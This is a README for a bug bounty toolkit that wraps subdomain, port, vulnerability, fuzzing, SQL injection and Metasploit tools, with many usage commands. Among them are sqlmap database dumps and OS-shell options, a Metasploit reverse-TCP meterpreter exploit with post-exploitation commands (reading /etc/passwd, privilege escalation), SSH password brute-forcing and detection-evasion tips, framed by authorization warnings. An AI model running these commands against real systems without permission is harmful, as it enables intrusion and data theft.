# BountyRecon - Security Assessment Toolkit

**Created by:** 0xZan  
**Purpose:** Comprehensive bug bounty reconnaissance and vulnerability assessment toolkit

---

## 🎯 Features

- **Unified Scanner**: Automated reconnaissance combining 7 powerful tools
- **Subdomain Discovery**: Find hidden subdomains with Subfinder
- **HTTP Probing**: Identify live hosts and technologies with httpx
- **Port Scanning**: Comprehensive port scanning with Nmap
- **Vulnerability Detection**: Template-based scanning with Nuclei (5000+ templates)
- **Directory Fuzzing**: Discover hidden paths with ffuf
- **SQL Injection Testing**: Automated SQLi detection with sqlmap
- **Exploitation Framework**: Full Metasploit integration
- **Organized Results**: Clean folder structure with numbered access
- **Comprehensive Reports**: Text and JSON output formats

---

## 📋 Table of Contents

- [Installation](#-installation)
- [Quick Start](#-quick-start)
- [Directory Structure](#-directory-structure)
- [BountyRecon Scanner](#-bountyrecon-scanner-unified-tool)
- [Individual Tools](#-individual-tools)
  - [Subfinder](#1-subfinder---subdomain-enumeration)
  - [httpx](#2-httpx---http-toolkit)
  - [Nmap](#3-nmap---port-scanner)
  - [Nuclei](#4-nuclei---vulnerability-scanner)
  - [ffuf](#5-ffuf---web-fuzzer)
  - [sqlmap](#6-sqlmap---sql-injection-tool)
  - [Metasploit](#7-metasploit---exploitation-framework)
- [Workflow Examples](#-complete-workflow-examples)
- [Tips & Best Practices](#-tips--best-practices)
- [Troubleshooting](#-troubleshooting)

---

## 🚀 Installation

### Automatic Installation

```bash
# Clone the repository
git clone https://github.com/OxZan/BountyRecon.git
cd BountyRecon

# Run installer (installs all tools and dependencies)
chmod +x Install.sh
./Install.sh

# Organize directory structure
chmod +x organize_0xZan.sh
./organize_0xZan.sh

# Reload shell to apply changes
source ~/.bashrc
```

### Manual Installation

If you prefer manual installation or the script fails:

```bash
# Install system dependencies
sudo apt update && sudo apt upgrade -y
sudo apt install -y python3 python3-pip golang-go nmap sqlmap metasploit-framework

# Install Go tools
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install github.com/ffuf/ffuf/v2@latest

# Update Nuclei templates
nuclei -update-templates

# Install Python dependencies
pip3 install --break-system-packages requests beautifulsoup4 python-nmap colorama

# Download wordlists
git clone https://github.com/danielmiessler/SecLists.git ~/0xZan/wordlists/SecLists
```

---

## ⚡ Quick Start

### Using BountyRecon (Recommended)

```bash
# Navigate to toolkit directory
cd ~/0xZan

# Quick scan (5-10 minutes)
python3 bountyrecon.py -d example.com --quick

# Full comprehensive scan (20-40 minutes)
python3 bountyrecon.py -d example.com

# Scan a specific URL
python3 bountyrecon.py -u https://example.com

# Scan an IP address
python3 bountyrecon.py -i 192.168.1.100

# View all scans
cd Results
./list

# Access a specific scan
cd 1              # Enter scan #1
cat scan.txt      # View the report
```

---

## 📁 Directory Structure

```
~/0xZan/
├── bountyrecon.py           # Main unified scanner
├── Install.sh               # Auto-installer script
├── organize_0xZan.sh        # Directory organizer
├── README.md                # This file
│
├── tools/                   # All security tools
│   ├── nmap/               # Port scanning
│   ├── subfinder/          # Subdomain enumeration
│   ├── httpx/              # HTTP toolkit
│   ├── nuclei/             # Vulnerability scanner
│   ├── ffuf/               # Web fuzzer
│   ├── sqlmap/             # SQL injection tester
│   └── metasploit/         # Exploitation framework
│
├── Results/                 # Scan results (auto-organized)
│   ├── list                # Script to view all scans
│   ├── 1 → walmart_20251107/    # Numbered symlinks
│   ├── 2 → google_20251106/
│   └── walmart_20251107/
│       ├── scan.txt        # Human-readable report
│       ├── results.json    # Machine-readable data
│       ├── subdomains.txt
│       ├── live_hosts.txt
│       ├── nmap_scan.txt
│       └── nuclei_results.txt
│
└── wordlists/              # SecLists and custom wordlists
    └── SecLists/
```

---

## 🔧 BountyRecon Scanner (Unified Tool)

The main scanner that combines all tools into one automated workflow.

### Command Options

```bash
python3 bountyrecon.py [options]

Required (choose one):
  -d, --domain DOMAIN    Target domain (e.g., example.com)
  -u, --url URL          Target URL (e.g., https://example.com)
  -i, --ip IP            Target IP address

Optional:
  --quick                Quick scan mode (faster, skips directory discovery)
  -o, --output DIR       Custom output directory
  -h, --help             Show help message
```

### What It Does

**Phase 1: Subdomain Enumeration (Subfinder)**
- Discovers all subdomains of target domain
- Uses multiple data sources (crt.sh, VirusTotal, etc.)
- Output: `subdomains.txt`

**Phase 2: HTTP Service Probing (httpx)**
- Tests which subdomains are alive
- Identifies HTTP/HTTPS services
- Detects web technologies
- Output: `live_hosts.txt`

**Phase 3: Port Scanning (Nmap)**
- Scans for open ports and services
- Quick mode: Top 100 ports
- Full mode: All 65535 ports
- Output: `nmap_scan.txt`

**Phase 4: Vulnerability Scanning (Nuclei)**
- Tests for known vulnerabilities
- 5000+ vulnerability templates
- Quick mode: Critical/High severity
- Full mode: Critical/High/Medium severity
- Output: `nuclei_results.txt`

**Phase 5: Directory Discovery (ffuf)** *(Full mode only)*
- Fuzzes for hidden directories and files
- Checks for admin panels, backups, configs
- Uses SecLists wordlists
- Output: `ffuf_results.json`

### Usage Examples

```bash
# Example 1: Quick reconnaissance on a bug bounty target
python3 bountyrecon.py -d hackerone.com --quick
# Time: ~5-10 minutes
# Output: Subdomains, live hosts, ports, critical vulnerabilities

# Example 2: Comprehensive security assessment
python3 bountyrecon.py -d target.com
# Time: ~20-40 minutes
# Output: Full reconnaissance + directory discovery

# Example 3: Scan a specific web application
python3 bountyrecon.py -u https://app.example.com --quick
# Tests single URL for vulnerabilities

# Example 4: Scan internal network host
python3 bountyrecon.py -i 192.168.1.100
# Port scan + vulnerability assessment

# Example 5: Scan with custom output location
python3 bountyrecon.py -d example.com -o /tmp/custom_scan
```

### Reading the Report

After a scan completes, view your results:

```bash
# List all scans
cd ~/0xZan/Results
./list

# Access latest scan
cd 1

# View report in terminal
cat scan.txt

# View JSON data
cat results.json

# View specific outputs
cat subdomains.txt
cat live_hosts.txt
cat nuclei_results.txt
```

---

## 🛠️ Individual Tools

For advanced users who want granular control, each tool can be used independently.

---

### 1. Subfinder - Subdomain Enumeration

**Description:** Passive subdomain discovery tool that uses multiple sources.

**Location:** `~/0xZan/tools/subfinder/`

#### Basic Usage

```bash
cd ~/0xZan/tools/subfinder

# Basic subdomain enumeration
./subfinder -d example.com

# Save results to file
./subfinder -d example.com -o subdomains.txt

# Silent mode (only output subdomains)
./subfinder -d example.com -silent

# Use all sources
./subfinder -d example.com -all
```

#### Advanced Examples

```bash
# Enumerate multiple domains
./subfinder -dL domains.txt -o all_subdomains.txt

# Recursive subdomain discovery
./subfinder -d example.com -recursive

# Use specific sources only
./subfinder -d example.com -sources crtsh,virustotal

# Exclude specific subdomains
./subfinder -d example.com -nW -silent

# Rate limit requests (for stealth)
./subfinder -d example.com -rate-limit 10

# Specify timeout
./subfinder -d example.com -timeout 30
```

#### Real-World Example

```bash
# Bug bounty reconnaissance workflow
./subfinder -d hackerone.com -all -silent -o h1_subs.txt
cat h1_subs.txt | wc -l  # Count subdomains found

# Check for interesting subdomains
cat h1_subs.txt | grep -E "dev|staging|api|admin|test"
```

**Output:** List of discovered subdomains
**Time:** 30 seconds - 2 minutes

---

### 2. httpx - HTTP Toolkit

**Description:** Fast HTTP probing tool for checking live hosts and extracting information.

**Location:** `~/0xZan/tools/httpx/`

#### Basic Usage

```bash
cd ~/0xZan/tools/httpx

# Probe a single URL
./httpx -u https://example.com

# Probe multiple URLs from file
./httpx -l urls.txt

# Silent mode (clean output)
./httpx -l urls.txt -silent

# Show status codes
./httpx -l urls.txt -status-code
```

#### Advanced Examples

```bash
# Detect technologies
./httpx -l subdomains.txt -tech-detect

# Extract page titles
./httpx -l urls.txt -title

# Check for specific status codes
./httpx -l urls.txt -mc 200,301,302,403

# Extract response headers
./httpx -u https://example.com -include-response-header

# Follow redirects
./httpx -l urls.txt -follow-redirects

# Screenshot web pages
./httpx -l urls.txt -screenshot

# Extract response body
./httpx -u https://example.com -response-body

# Check specific ports
./httpx -l domains.txt -ports 80,443,8080,8443

# Rate limiting
./httpx -l urls.txt -rate-limit 150

# Custom timeout
./httpx -l urls.txt -timeout 10
```

#### Pipeline Examples

```bash
# Find admin panels
./httpx -l subdomains.txt -path /admin -mc 200,403

# Check for open redirects
./httpx -l urls.txt -path /?url=https://evil.com -mr "https://evil.com"

# Find all live HTTP services
cat subdomains.txt | ./httpx -silent -o live_hosts.txt

# Chain with other tools
cat subdomains.txt | ./httpx -silent | nuclei -t cves/

# Filter by technology
./httpx -l urls.txt -tech-detect -silent | grep -i wordpress
```

#### Real-World Example

```bash
# Complete HTTP reconnaissance
./httpx -l subdomains.txt -tech-detect -title -status-code -content-length -o probe_results.txt

# Find interesting endpoints
./httpx -l subdomains.txt -path /.git/config -mc 200
./httpx -l subdomains.txt -path /api/v1 -mc 200
./httpx -l subdomains.txt -paths endpoints.txt -mc 200
```

**Output:** Live hosts with HTTP information
**Time:** 10 seconds - 5 minutes (depending on targets)

---

### 3. Nmap - Port Scanner

**Description:** Network exploration and security auditing tool.

**Location:** `~/0xZan/tools/nmap/`

#### Basic Usage

```bash
cd ~/0xZan/tools/nmap

# Simple scan
./nmap example.com

# Scan specific ports
./nmap -p 80,443 example.com

# Scan port range
./nmap -p 1-1000 example.com

# Scan all ports
./nmap -p- example.com

# Fast scan (top 100 ports)
./nmap -F example.com
```

#### Advanced Examples

```bash
# Service version detection
./nmap -sV example.com

# Operating system detection
./nmap -O example.com

# Aggressive scan (OS detection, version detection, script scanning, traceroute)
./nmap -A example.com

# Scan multiple hosts
./nmap 192.168.1.1-254

# Scan from file
./nmap -iL targets.txt

# TCP SYN scan (requires root)
sudo nmap -sS example.com

# UDP scan
sudo nmap -sU example.com

# Script scanning
./nmap --script vuln example.com
./nmap --script http-enum example.com

# Timing templates (0-5, 5 is fastest)
./nmap -T4 example.com

# Save output in multiple formats
./nmap -oA scan_results example.com
# Creates: scan_results.nmap, scan_results.xml, scan_results.gnmap

# Verbose output
./nmap -v example.com
```

#### Useful Scripts

```bash
# HTTP enumeration
./nmap --script http-enum -p 80,443 example.com

# SSL/TLS information
./nmap --script ssl-cert,ssl-enum-ciphers -p 443 example.com

# SMB vulnerabilities
./nmap --script smb-vuln* -p 445 example.com

# FTP anonymous login
./nmap --script ftp-anon -p 21 example.com

# Database detection
./nmap --script mysql-info -p 3306 example.com
```

#### Real-World Examples

```bash
# Full port scan with service detection
./nmap -p- -sV -T4 -oN full_scan.txt example.com

# Quick vulnerability assessment
./nmap -sV --script vuln -oN vuln_scan.txt example.com

# Scan internal network
./nmap -sn 192.168.1.0/24  # Ping scan
./nmap -p 22,80,443 192.168.1.0/24 -oN network_scan.txt

# Stealth scan
sudo nmap -sS -T2 -f example.com
```

**Output:** Open ports and running services
**Time:** 30 seconds - 30 minutes (depending on scope)

---

### 4. Nuclei - Vulnerability Scanner

**Description:** Template-based vulnerability scanner with 5000+ community templates.

**Location:** `~/0xZan/tools/nuclei/`

#### Basic Usage

```bash
cd ~/0xZan/tools/nuclei

# Update templates first
./nuclei -update-templates

# Scan single URL
./nuclei -u https://example.com

# Scan multiple URLs
./nuclei -l urls.txt

# Scan with specific severity
./nuclei -l urls.txt -severity critical,high

# Silent mode
./nuclei -l urls.txt -silent
```

#### Advanced Examples

```bash
# Scan with specific templates
./nuclei -u https://example.com -t cves/
./nuclei -u https://example.com -t vulnerabilities/
./nuclei -u https://example.com -t exposures/

# Scan multiple template directories
./nuclei -l urls.txt -t cves/ -t vulnerabilities/

# Exclude specific templates
./nuclei -l urls.txt -exclude-templates exposures/

# Search for specific CVE
./nuclei -u https://example.com -t cves/2021/

# Rate limiting
./nuclei -l urls.txt -rate-limit 150

# Bulk headers
./nuclei -l urls.txt -bulk-size 25

# Custom timeout
./nuclei -l urls.txt -timeout 10

# Save results
./nuclei -l urls.txt -o results.txt
./nuclei -l urls.txt -json -o results.json

# Only new findings
./nuclei -l urls.txt -exclude-severity info
```

#### Filtering Examples

```bash
# Only critical vulnerabilities
./nuclei -l urls.txt -severity critical

# Only high and critical
./nuclei -l urls.txt -severity critical,high

# Everything except info
./nuclei -l urls.txt -severity critical,high,medium,low

# Specific tags
./nuclei -l urls.txt -tags xss,sqli,rce

# Exclude tags
./nuclei -l urls.txt -exclude-tags dos

# Search templates
./nuclei -tl | grep -i wordpress
```

#### Real-World Examples

```bash
# Quick bug bounty scan
cat live_hosts.txt | ./nuclei -severity critical,high -silent -o findings.txt

# Complete vulnerability assessment
./nuclei -l targets.txt -t cves/ -t vulnerabilities/ -t exposures/ -severity critical,high,medium -o full_scan.txt

# Continuous monitoring
while true; do
  ./nuclei -l urls.txt -severity critical,high -o monitor_$(date +%Y%m%d).txt
  sleep 3600  # Run every hour
done

# Technology-specific scans
./nuclei -l urls.txt -tags wordpress
./nuclei -l urls.txt -tags apache
./nuclei -l urls.txt -tags nginx
```

#### Pipeline with Other Tools

```bash
# Complete reconnaissance to vulnerability detection
subfinder -d example.com -silent | httpx -silent | nuclei -severity critical,high

# Subdomain takeover check
subfinder -d example.com -silent | httpx -silent | nuclei -t takeovers/
```

**Output:** Vulnerabilities found with severity ratings
**Time:** 2-20 minutes (depending on targets and templates)

---

### 5. ffuf - Web Fuzzer

**Description:** Fast web fuzzer for directory and file discovery.

**Location:** `~/0xZan/tools/ffuf/`

#### Basic Usage

```bash
cd ~/0xZan/tools/ffuf

# Directory fuzzing
./ffuf -u https://example.com/FUZZ -w wordlist.txt

# Match status codes
./ffuf -u https://example.com/FUZZ -w wordlist.txt -mc 200,301,302

# Silent mode
./ffuf -u https://example.com/FUZZ -w wordlist.txt -s
```

#### Advanced Examples

```bash
# Multiple FUZZing points
./ffuf -u https://example.com/FUZZ/FUZ2Z -w wordlist1.txt:FUZZ -w wordlist2.txt:FUZ2Z

# Subdomain fuzzing
./ffuf -u https://FUZZ.example.com -w subdomains.txt

# Virtual host discovery
./ffuf -u https://example.com -H "Host: FUZZ.example.com" -w wordlists.txt

# Parameter fuzzing
./ffuf -u https://example.com/api?FUZZ=test -w params.txt

# POST data fuzzing
./ffuf -u https://example.com/login -X POST -d "username=admin&password=FUZZ" -w passwords.txt

# Custom headers
./ffuf -u https://example.com/FUZZ -w wordlist.txt -H "Authorization: Bearer token"

# Filter by response size
./ffuf -u https://example.com/FUZZ -w wordlist.txt -fs 4242

# Filter by word count
./ffuf -u https://example.com/FUZZ -w wordlist.txt -fw 100

# Rate limiting
./ffuf -u https://example.com/FUZZ -w wordlist.txt -rate 100

# Recursion
./ffuf -u https://example.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2

# Save output
./ffuf -u https://example.com/FUZZ -w wordlist.txt -o results.json -of json
```

#### Using SecLists Wordlists

```bash
# Common directories
./ffuf -u https://example.com/FUZZ -w ~/0xZan/wordlists/SecLists/Discovery/Web-Content/common.txt

# Directory list 2.3 medium
./ffuf -u https://example.com/FUZZ -w ~/0xZan/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

# Big.txt (large wordlist)
./ffuf -u https://example.com/FUZZ -w ~/0xZan/wordlists/SecLists/Discovery/Web-Content/big.txt

# Admin panels
./ffuf -u https://example.com/FUZZ -w ~/0xZan/wordlists/SecLists/Discovery/Web-Content/admin-panels.txt

# Backup files
./ffuf -u https://example.com/FUZZ -w ~/0xZan/wordlists/SecLists/Discovery/Web-Content/backup-files.txt

# API endpoints
./ffuf -u https://example.com/api/FUZZ -w ~/0xZan/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints.txt
```

#### Real-World Examples

```bash
# Find admin panels
./ffuf -u https://example.com/FUZZ -w ~/0xZan/wordlists/SecLists/Discovery/Web-Content/admin-panels.txt -mc 200,403

# Find backup files
./ffuf -u https://example.com/FUZZ -w ~/0xZan/wordlists/SecLists/Discovery/Web-Content/backup-files.txt -mc 200

# API fuzzing
./ffuf -u https://api.example.com/v1/FUZZ -w api-endpoints.txt -mc 200,201,401,403

# Complete directory discovery
./ffuf -u https://example.com/FUZZ -w ~/0xZan/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -mc 200,301,302,401,403 -fc 404 -o discovery.json -of json

# Extension fuzzing
./ffuf -u https://example.com/admin.FUZZ -w ~/0xZan/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt

# Combined directory and file fuzzing
./ffuf -u https://example.com/FUZZ/FUZ2Z -w dirs.txt:FUZZ -w files.txt:FUZ2Z
```

**Output:** Discovered directories, files, and endpoints
**Time:** 1-30 minutes (depending on wordlist size)

---

### 6. sqlmap - SQL Injection Tool

**Description:** Automatic SQL injection and database takeover tool.

**Location:** `~/0xZan/tools/sqlmap/`

#### ⚠️ Important Warning

**Only use sqlmap on authorized targets!** SQL injection testing can:
- Modify database contents
- Crash applications
- Violate terms of service
- Be illegal without permission

#### Basic Usage

```bash
cd ~/0xZan/tools/sqlmap

# Test a single URL parameter
./sqlmap -u "http://example.com/page?id=1"

# Test with POST data
./sqlmap -u "http://example.com/login" --data="username=admin&password=test"

# Test specific parameter
./sqlmap -u "http://example.com/page?id=1&name=test" -p id

# Batch mode (non-interactive)
./sqlmap -u "http://example.com/page?id=1" --batch
```

#### Advanced Examples

```bash
# Specify injection technique
./sqlmap -u "http://example.com/page?id=1" --technique=BEUST
# B: Boolean-based blind
# E: Error-based
# U: UNION query-based
# S: Stacked queries
# T: Time-based blind

# Risk and level
./sqlmap -u "http://example.com/page?id=1" --level=5 --risk=3
# Level: 1-5 (tests to perform)
# Risk: 1-3 (dangerous tests)

# Custom headers
./sqlmap -u "http://example.com/page?id=1" --headers="Authorization: Bearer token123"

# Cookies
./sqlmap -u "http://example.com/page?id=1" --cookie="session=abc123"

# User agent
./sqlmap -u "http://example.com/page?id=1" --random-agent

# Test from request file
./sqlmap -r request.txt

# Database enumeration
./sqlmap -u "http://example.com/page?id=1" --dbs

# Current database
./sqlmap -u "http://example.com/page?id=1" --current-db

# Tables enumeration
./sqlmap -u "http://example.com/page?id=1" -D database_name --tables

# Columns enumeration
./sqlmap -u "http://example.com/page?id=1" -D database_name -T table_name --columns

# Dump table data
./sqlmap -u "http://example.com/page?id=1" -D database_name -T users --dump

# Dump all
./sqlmap -u "http://example.com/page?id=1" --dump-all

# SQL shell
./sqlmap -u "http://example.com/page?id=1" --sql-shell

# Operating system shell (if DBA)
./sqlmap -u "http://example.com/page?id=1" --os-shell
```

#### Working with Authentication

```bash
# HTTP authentication
./sqlmap -u "http://example.com/page?id=1" --auth-type=Basic --auth-cred="user:pass"

# Session file
./sqlmap -u "http://example.com/page?id=1" --cookie="PHPSESSID=xyz123"

# CSRF token
./sqlmap -u "http://example.com/page?id=1" --csrf-token="token"
```

#### Real-World Examples

```bash
# Quick SQLi check (safe)
./sqlmap -u "http://example.com/page?id=1" --batch --smart

# Complete database extraction
./sqlmap -u "http://example.com/page?id=1" --batch --dbs
./sqlmap -u "http://example.com/page?id=1" --batch -D target_db --tables
./sqlmap -u "http://example.com/page?id=1" --batch -D target_db -T users --dump

# Test from Burp Suite request
# 1. Save request from Burp to request.txt
# 2. Mark injection point with * (e.g., id=1*)
./sqlmap -r request.txt --batch

# Bug bounty safe approach
./sqlmap -u "http://example.com/page?id=1" --batch --level=1 --risk=1 --technique=BEU
```

**Output:** SQL injection vulnerabilities and extracted data
**Time:** 2-60 minutes (depending on complexity)

---

### 7. Metasploit - Exploitation Framework

**Description:** World's most used penetration testing framework.

**Location:** `~/0xZan/tools/metasploit/`

#### ⚠️ Critical Warning

**Most bug bounty programs PROHIBIT exploitation!**
- Read program rules carefully
- NEVER use on unauthorized targets
- Exploitation can cause damage
- Legal consequences for misuse

#### Basic Usage

```bash
cd ~/0xZan/tools/metasploit

# Start Metasploit console
./msfconsole

# Quick start
msfconsole -q  # Quiet mode (no banner)
```

#### Inside Metasploit Console

```bash
# Search for exploits
msf6 > search apache
msf6 > search type:exploit platform:linux
msf6 > search cve:2021

# Get information about a module
msf6 > info exploit/multi/http/apache_mod_cgi_bash_env_exec

# Use a module
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec

# Show options
msf6 exploit(...) > show options

# Set required options
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set RPORT 80
msf6 exploit(...) > set LHOST 192.168.1.50

# Show payloads
msf6 exploit(...) > show payloads

# Set payload
msf6 exploit(...) > set payload linux/x86/meterpreter/reverse_tcp

# Check if target is vulnerable
msf6 exploit(...) > check

# Run the exploit
msf6 exploit(...) > run
# or
msf6 exploit(...) > exploit

# Background session
meterpreter > background

# List sessions
msf6 > sessions -l

# Interact with session
msf6 > sessions -i 1

# Exit
msf6 > exit
```

#### Auxiliary Modules (Scanning Only)

```bash
# Port scanner
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# HTTP version scanner
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# SMB version scanner
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# SSH login scanner
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set USERNAME root
msf6 auxiliary(...) > set PASS_FILE passwords.txt
msf6 auxiliary(...) > run
```

#### Meterpreter Commands

```bash
# System information
meterpreter > sysinfo
meterpreter > getuid

# File system
meterpreter > ls
meterpreter > cd /tmp
meterpreter > pwd
meterpreter > download /etc/passwd
meterpreter > upload file.txt /tmp/

# Process management
meterpreter > ps
meterpreter > getpid
meterpreter > migrate 1234

# Network
meterpreter > ifconfig
meterpreter > netstat
meterpreter > route

# Privilege escalation
meterpreter > getsystem

# Shell access
meterpreter > shell
```

#### Safe Practice (Authorized Testing Only)

```bash
# Vulnerability validation (no exploitation)
msf6 > use auxiliary/scanner/http/apache_module_exploit_check
msf6 auxiliary(...) > set RHOSTS target.com
msf6 auxiliary(...) > run

# Banner grabbing
msf6 > use auxiliary/scanner/http/http_header
msf6 auxiliary(...) > set RHOSTS target.com
msf6 auxiliary(...) > run
```

#### Database Setup

```bash
# Initialize database
msfdb init

# Check database connection
msf6 > db_status

# Workspace management
msf6 > workspace -a project_name
msf6 > workspace project_name

# Import Nmap scan
msf6 > db_import nmap_scan.xml

# List hosts
msf6 > hosts

# List services
msf6 > services
```

**Output:** Depends on module (reconnaissance data or exploitation results)
**Time:** Varies by module

---

## 🔄 Complete Workflow Examples

### Example 1: Basic Bug Bounty Reconnaissance

```bash
# Step 1: Find subdomains
cd ~/0xZan/tools/subfinder
./subfinder -d target.com -o subs.txt

# Step 2: Find live hosts
cd ~/0xZan/tools/httpx
./httpx -l ../subfinder/subs.txt -o live.txt

# Step 3: Scan for vulnerabilities
cd ~/0xZan/tools/nuclei
./nuclei -l ../httpx/live.txt -severity critical,high -o vulns.txt
```

### Example 2: Comprehensive Assessment

```bash
# Use the unified scanner
cd ~/0xZan
python3 bountyrecon.py -d target.com

# Review results
cd Results/1
cat scan.txt

# Follow up with manual testing on interesting findings
cd ~/0xZan/tools/sqlmap
./sqlmap -u "http://vulnerable.target.com/page?id=1" --batch
```

### Example 3: API Security Testing

```bash
# Step 1: Discover API endpoints
cd ~/0xZan/tools/ffuf
./ffuf -u https://api.target.com/v1/FUZZ -w ~/0xZan/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints.txt -mc 200

# Step 2: Test discovered endpoints
cd ~/0xZan/tools/nuclei
./nuclei -u https://api.target.com -t exposures/apis/

# Step 3: Parameter testing
cd ~/0xZan/tools/ffuf
./ffuf -u "https://api.target.com/v1/users?FUZZ=test" -w params.txt -mc 200
```

### Example 4: Internal Network Assessment

```bash
# Step 1: Host discovery
cd ~/0xZan/tools/nmap
./nmap -sn 192.168.1.0/24 -oG hosts.txt

# Step 2: Port scanning
./nmap -p- -T4 -iL hosts.txt -oA full_scan

# Step 3: Service enumeration
./nmap -sV -sC -iL hosts.txt -oA service_scan

# Step 4: Vulnerability scanning
cd ~/0xZan/tools/nuclei
./nuclei -l network_hosts.txt -t cves/ -t vulnerabilities/
```

---

## 💡 Tips & Best Practices

### Bug Bounty Hunting

1. **Always read the program rules** - Understand scope and restrictions
2. **Start with quick reconnaissance** - Use `--quick` mode first
3. **Focus on interesting subdomains** - dev, staging, api, admin, test
4. **Verify findings manually** - Automated tools can have false positives
5. **Document everything** - Keep notes of your methodology
6. **Report responsibly** - Follow disclosure guidelines

### Performance Optimization

```bash
# Speed up scans with parallelization
cat targets.txt | parallel -j 5 'nuclei -u {} -o results_{#}.txt'

# Use rate limiting to avoid detection
nuclei -l targets.txt -rate-limit 50

# Combine tools efficiently
subfinder -d target.com -silent | httpx -silent | nuclei -severity critical
```

### Stealth Techniques

```bash
# Slow scans to avoid detection
nmap -T2 target.com

# Random user agent
httpx -l urls.txt -random-agent

# Use proxies (if needed)
nuclei -l urls.txt -proxy http://127.0.0.1:8080
```

### Result Management

```bash
# View all scans chronologically
cd ~/0xZan/Results
./list

# Compare two scans
diff 1/scan.txt 2/scan.txt

# Extract only vulnerabilities
cd ~/0xZan/Results/1
grep -E "critical|high" nuclei_results.txt

# Count findings
cat nuclei_results.txt | wc -l
```

---

## 🐛 Troubleshooting

### Common Issues

**"Command not found" errors:**
```bash
# Reload shell configuration
source ~/.bashrc

# Check if Go bin is in PATH
echo $PATH | grep go/bin

# Manually add to PATH
export PATH=$PATH:$HOME/go/bin
```

**Nuclei templates not found:**
```bash
cd ~/0xZan/tools/nuclei
./nuclei -update-templates
```

**Permission denied:**
```bash
# Make scripts executable
chmod +x bountyrecon.py
chmod +x organize_0xZan.sh
```

**Nmap requires root for SYN scan:**
```bash
# Use sudo for SYN scans
sudo nmap -sS target.com

# Or use TCP connect scan (no root needed)
nmap -sT target.com
```

**ffuf wordlist not found:**
```bash
# Download SecLists
git clone https://github.com/danielmiessler/SecLists.git ~/0xZan/wordlists/SecLists
```

**Tool not installed:**
```bash
# Re-run installer
cd ~/0xZan
./Install.sh
```

### Getting Help

```bash
# Tool help menus
python3 bountyrecon.py -h
subfinder -h
httpx -h
nuclei -h
ffuf -h
sqlmap -h
```

---

## 📚 Additional Resources

### Documentation
- [Subfinder Wiki](https://github.com/projectdiscovery/subfinder)
- [httpx Documentation](https://github.com/projectdiscovery/httpx)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates)
- [ffuf GitHub](https://github.com/ffuf/ffuf)
- [sqlmap User Manual](https://github.com/sqlmapproject/sqlmap/wiki)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)

### Learning Resources
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackerOne Hacker101](https://www.hacker101.com/)
- [Bug Bounty Platforms](https://www.bugcrowd.com/, https://www.hackerone.com/)

---

## ⚖️ Legal Disclaimer

**IMPORTANT:** This toolkit is for authorized security testing only.

- ✅ Use on bug bounty programs with permission
- ✅ Use on your own systems
- ✅ Use with written authorization
- ❌ Do NOT use on systems without permission
- ❌ Do NOT use for illegal activities
- ❌ Do NOT cause damage or disruption

**Unauthorized access to computer systems is illegal.** The creator of this toolkit is not responsible for misuse. Always follow ethical hacking guidelines and applicable laws.

---

## 📝 License

MIT License - See LICENSE file for details

---

## 🤝 Contributing

Contributions are welcome! Please feel free to submit issues and pull requests.

---

## 📧 Contact

**Created by:** 0xZan  
**GitHub:** [Your GitHub]  
**Twitter:** [@YourTwitter]

---

## 🎯 Happy Hunting!

Remember: With great power comes great responsibility. Use this toolkit ethically and legally. Happy bug hunting! 🐛🔍
